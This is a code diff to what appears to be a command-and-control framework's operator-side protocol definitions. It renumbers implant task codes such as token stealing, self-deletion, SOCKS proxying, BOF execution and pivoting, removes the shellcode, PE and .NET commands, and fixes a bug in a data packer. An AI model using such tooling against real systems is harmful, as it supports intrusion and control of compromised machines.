@@ -54,19 +54,16 @@ SB_INJ_PE   = 31;
 
 T_CONFIG    = 10;
 T_PROCESS   = 11;
-T_INJECTION = 12;
-T_FILESYS   = 13;
-T_UPLOAD    = 14;
-T_DOWNLOAD  = 15;
-T_INFO      = 16;
-T_SELFDEL   = 17;
-T_EXIT      = 18;
-T_DOTNET    = 19;
-T_SOCKS     = 20;
-T_EXEC_SC   = 21;
-T_EXEC_PE   = 22;
-T_EXEC_BOF  = 23;
-T_TOKEN     = 24;
+T_FILESYS   = 12;
+T_UPLOAD    = 13;
+T_DOWNLOAD  = 14;
+T_INFO      = 15;
+T_SELFDEL   = 16;
+T_EXIT      = 17;
+T_SOCKS     = 18;
+T_EXEC_BOF  = 19;
+T_TOKEN     = 20;
+T_PIVOT     = 21;
 
 SB_TKN_UUID  = 10;
 SB_TKN_STEAL = 11;
@@ -125,8 +122,6 @@ Commands = {
     "download":  {"hex_code": T_DOWNLOAD},
     "info"    :  {"hex_code": T_INFO},
     "exec-bof":  {"hex_code": T_EXEC_BOF},
-    "exec-sc" :  {"hex_code": T_EXEC_SC},
-    "exec-pe" :  {"hex_code": T_EXEC_PE},
 
     "token": {
         "hex_code": T_TOKEN,
@@ -138,17 +133,6 @@ Commands = {
             "store": {"sub": SB_TKN_STORE},
             "use": {"sub": SB_TKN_USE},
             "rm": {"sub": SB_TKN_RM}
-        }
-    },
-
-    "dotnet": {
-        "hex_code": T_DOTNET,
-        "subcommands": {
-            "inline": { "sub": SB_DT_INLINE },
-            "spawn" : { "sub": SB_DT_SPAWN },
-            "list-version": { "sub": SB_DT_LIST },
-            "unload": { "sub": SB_DT_UNLOAD },
-            "invoke": { "sub": SB_DT_INVOKE }
         }
     },
 
@@ -270,7 +254,7 @@ class Packer:
     def Char( self, data:bytes ) -> None:
         if data is None:
             data = ''
-        if isinstance(s, str):
+        if isinstance(data, str):
             data = data.encode("utf-8" )
         fmt = "<L{}s".format(len(data) + 1)
         self.buffer += pack(fmt, len(data)+1, data)
